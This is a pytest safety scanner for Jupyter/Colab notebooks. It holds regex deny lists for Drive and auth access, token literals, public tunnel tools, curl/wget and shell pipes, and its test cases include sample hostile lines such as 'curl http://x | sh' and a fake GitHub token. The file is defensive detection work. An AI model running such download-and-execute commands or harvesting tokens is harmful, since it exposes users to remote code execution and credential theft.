"""
Notebook safety check (also run by CI).

Every ``.ipynb`` in the repository is scanned.  The Colab notebook must be safe for ANYONE to run:
it may not touch Google Drive / auth / Colab Secrets, open public tunnels, pipe downloads into a
shell, or evaluate downloaded text; it must fetch the code from the public repo at a PINNED
40-character commit hash and install only version-pinned packages.

The scanner is a plain function (``scan_notebook``) so the tests can also prove that it really
catches each forbidden pattern on small synthetic notebooks (a safety check that cannot fail is
worthless).

NOTE: the scan covers CODE cells.  Markdown cells legitimately *talk about* ``drive.mount`` when
they promise never to use it, so they are only checked for the required plain-words disclaimer.
"""
import json
import os
import re
import warnings

import pytest

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
PLACEHOLDER_REF = "<COMMIT-HASH>"        # allowed only until the first real commit exists (see test below)

# (name, regex) -- searched in the concatenated source of all CODE cells.
FORBIDDEN = [
    ("google.colab drive/auth/files/userdata",
     r"google\.colab\.(drive|auth|files|userdata)\b|from\s+google\.colab\s+import[^\n]*\b(drive|auth|files|userdata)\b"),
    ("drive.mount", r"\bdrive\s*\.\s*mount\b"),
    ("authenticate_user", r"authenticate_user"),
    ("Colab Secrets / userdata", r"\buserdata\b"),
    ("token / secret environment variables",
     r"os\.environ[^\n]*(TOKEN|SECRET|PASSWORD|API_?KEY)|getenv\([^\n]*(TOKEN|SECRET|PASSWORD|API_?KEY)"),
    ("token literals", r"\b(ghp_|gho_|github_pat_|hf_[A-Za-z0-9]{10}|AKIA[0-9A-Z]{12}|sk-[A-Za-z0-9]{20})"),
    ("public tunnel (ngrok/localtunnel/cloudflared/serveo/...)",
     r"ngrok|localtunnel|cloudflared|trycloudflare|serveo|pagekite|loophole|\blt\s+--port"),
    ("curl/wget", r"\b(curl|wget)\b"),
    ("pipe into a shell", r"\|\s*(sudo\s+)?(ba|z|da)?sh\b"),
    ("eval()", r"\beval\s*\("),
    ("exec()", r"\bexec\s*\("),
    ("binding to all interfaces", r"0\.0\.0\.0"),
]


def _code(nb):
    """Concatenate the source of all code cells (list-of-lines or string, both occur in .ipynb)."""
    chunks = []
    for cell in nb.get("cells", []):
        if cell.get("cell_type") == "code":
            src = cell.get("source", "")
            chunks.append("".join(src) if isinstance(src, list) else src)
    return "\n".join(chunks)


def _first_cell_text(nb):
    cell = nb["cells"][0]
    src = cell.get("source", "")
    return ("".join(src) if isinstance(src, list) else src) if cell.get("cell_type") == "markdown" else ""


def _unpinned_pip_installs(code):
    """Return pip-install lines that contain a package without an exact ``==`` pin."""
    bad = []
    for line in code.splitlines():
        m = re.search(r"pip\s+install\s+([^\"'\n]*)", line)    # arguments up to the closing quote / end of line
        if not m:
            continue
        args = re.split(r"\s+#", m.group(1))[0].split()      # drop a trailing comment
        pkgs = [a for a in args if not a.startswith("-")]
        # a local checkout (``pip install -e <dir>`` / a path variable) is part of the pinned commit
        pkgs = [a for a in pkgs if not (a in (".",) or a.startswith(("/", "{", "$")) or "CODE" in a or "ROOT" in a)]
        bad += [f"{line.strip()}   <-- '{a}' is not pinned with =="
                for a in pkgs if "==" not in a]
    return bad


def scan_notebook(nb):
    """Return a list of human-readable problems found in notebook dict ``nb`` (empty = safe)."""
    problems = []
    code = _code(nb)

    for name, pattern in FORBIDDEN:
        if re.search(pattern, code, flags=re.IGNORECASE):
            problems.append(f"forbidden pattern: {name}")

    problems += [f"unpinned pip install: {s}" for s in _unpinned_pip_installs(code)]

    # a GUI may only be shown through Colab's own authenticated proxy, and bound to localhost
    if re.search(r"streamlit", code) and "serve_kernel_port_as_iframe" not in code:
        problems.append("a GUI is started but not shown via serve_kernel_port_as_iframe")
    if re.search(r"--server\.address", code) and not re.search(r"--server\.address\W+127\.0\.0\.1", code):
        problems.append("the GUI server address is not 127.0.0.1")
    if re.search(r"streamlit\s*\W+run|\"streamlit\"\s*,\s*\"run\"", code) and "--server.address" not in code:
        problems.append("the GUI server does not set --server.address 127.0.0.1")

    # the code must be fetched from a github.com repo at a pinned REF
    ref = re.search(r"^\s*REF\s*=\s*[\"']([^\"']*)[\"']", code, flags=re.MULTILINE)
    if ref is None:
        problems.append("no REF = \"<commit hash>\" assignment found")
    elif ref.group(1) not in (PLACEHOLDER_REF,) and not re.fullmatch(r"[0-9a-f]{40}", ref.group(1)):
        problems.append(f"REF is not a full 40-character commit hash: {ref.group(1)!r}")
    if re.search(r"(?i)\b(main|master|HEAD)\b", ref.group(1) if ref else ""):
        problems.append("REF must be a commit hash, never a branch name")
    repo = re.search(r"^\s*REPO\s*=\s*[\"']([^\"']*)[\"']", code, flags=re.MULTILINE)
    if repo is None:
        problems.append("no REPO = \"https://github.com/...\" assignment found")
    elif not re.fullmatch(r"https://github\.com/[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+(\.git)?", repo.group(1)) \
            and "<" not in repo.group(1):
        problems.append(f"REPO is not a plain https://github.com/<user>/<repo> URL: {repo.group(1)!r}")
    if "subprocess.run" in code and "check=True" not in code:
        problems.append("subprocess.run without check=True")

    # the first cell must say, in plain words, what the notebook does and does not access
    first = _first_cell_text(nb).lower()
    for needle in ("drive", "token", "never"):
        if needle not in first:
            problems.append(f"first cell (markdown) does not mention {needle!r}; it must state what the "
                            f"notebook does/does not access and warn against mounting Drive or pasting tokens")
    return problems


def find_notebooks():
    """All .ipynb files in the repository (virtual environments and VCS metadata excluded)."""
    found = []
    for root, dirs, files in os.walk(REPO_ROOT):
        dirs[:] = [d for d in dirs if d not in (".git", ".venv", "node_modules", ".ipynb_checkpoints", "build")]
        found += [os.path.join(root, f) for f in files if f.endswith(".ipynb")]
    return sorted(found)


# --------------------------------------------------------------------------- the real notebooks
def test_at_least_one_notebook_exists():
    assert find_notebooks(), "expected at least the Colab notebook under notebooks/"


@pytest.mark.parametrize("path", find_notebooks(), ids=lambda p: os.path.relpath(p, REPO_ROOT))
def test_repository_notebooks_are_safe(path):
    with open(path, encoding="utf-8") as fh:
        nb = json.load(fh)
    assert scan_notebook(nb) == []


@pytest.mark.parametrize("path", find_notebooks(), ids=lambda p: os.path.relpath(p, REPO_ROOT))
def test_ref_is_a_pinned_commit(path):
    """REF must be a 40-hex commit hash.  The placeholder is tolerated (with a warning) so the very first
    commit can exist; set DIFFFEA_REQUIRE_PINNED=1 (release/CI on tags) to make the placeholder fail."""
    with open(path, encoding="utf-8") as fh:
        code = _code(json.load(fh))
    ref = re.search(r"^\s*REF\s*=\s*[\"']([^\"']*)[\"']", code, flags=re.MULTILINE).group(1)
    if ref == PLACEHOLDER_REF:
        if os.environ.get("DIFFFEA_REQUIRE_PINNED") == "1":
            pytest.fail("REF is still the placeholder; pin a full commit hash before releasing")
        warnings.warn("notebook REF is still the placeholder (not yet pinned)")
        return
    assert re.fullmatch(r"[0-9a-f]{40}", ref)


# --------------------------------------------------------------------------- the checker itself
def _nb(code, first="Never mount Drive or paste a token: this notebook does not access them."):
    return {"cells": [{"cell_type": "markdown", "source": [first]},
                      {"cell_type": "code", "source": code.splitlines(keepends=True)}]}


GOOD = '''
REPO = "https://github.com/someone/somerepo.git"
REF = "0123456789abcdef0123456789abcdef01234567"
import subprocess
subprocess.run("git fetch", shell=True, check=True)
subprocess.run("pip install -q gmsh==4.15.2", shell=True, check=True)
'''


def test_checker_accepts_a_good_notebook():
    assert scan_notebook(_nb(GOOD)) == []


@pytest.mark.parametrize("bad", [
    "from google.colab import drive",
    "from google.colab import output, files",
    "import google.colab.auth",
    "drive.mount('/content/drive')",
    "auth.authenticate_user()",
    "from google.colab import userdata\nuserdata.get('X')",
    "import os; os.environ['GITHUB_TOKEN']",
    "token = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'",
    "!pip install pyngrok",
    "subprocess.run('lt --port 8501', shell=True, check=True)",
    "subprocess.run('curl http://x | sh', shell=True, check=True)",
    "subprocess.run('wget http://x/a.sh', shell=True, check=True)",
    "eval(open('x').read())",
    "exec(text)",
    "host = '0.0.0.0'",
    "subprocess.run('pip install requests', shell=True, check=True)",
    "subprocess.run('pip install -q numpy==1.0 requests', shell=True, check=True)",
])
def test_checker_rejects_forbidden_things(bad):
    assert scan_notebook(_nb(GOOD + "\n" + bad)) != []


@pytest.mark.parametrize("ref", ["main", "master", "HEAD", "abc123", "0123456789ABCDEF0123456789ABCDEF01234567",
                                 "0123456789abcdef0123456789abcdef0123456"])      # last one: 39 chars
def test_checker_rejects_unpinned_refs(ref):
    assert scan_notebook(_nb(GOOD.replace("0123456789abcdef0123456789abcdef01234567", ref))) != []


def test_checker_requires_the_plain_words_disclaimer():
    assert scan_notebook(_nb(GOOD, first="Hello")) != []


def test_checker_rejects_gui_without_colab_iframe_or_on_wrong_address():
    gui = 'subprocess.Popen(["python", "-m", "streamlit", "run", "app.py", "--server.address", "%s"])'
    assert scan_notebook(_nb(GOOD + gui % "127.0.0.1")) != []                       # no iframe call
    ok = gui % "127.0.0.1" + "\noutput.serve_kernel_port_as_iframe(8501)"
    assert scan_notebook(_nb(GOOD + ok)) == []
    assert scan_notebook(_nb(GOOD + (gui % "10.0.0.5") + "\noutput.serve_kernel_port_as_iframe(8501)")) != []


def test_checker_allows_serve_kernel_port_as_iframe():
    assert scan_notebook(_nb(GOOD + "\nfrom google.colab import output\noutput.serve_kernel_port_as_iframe(8501)")) == []
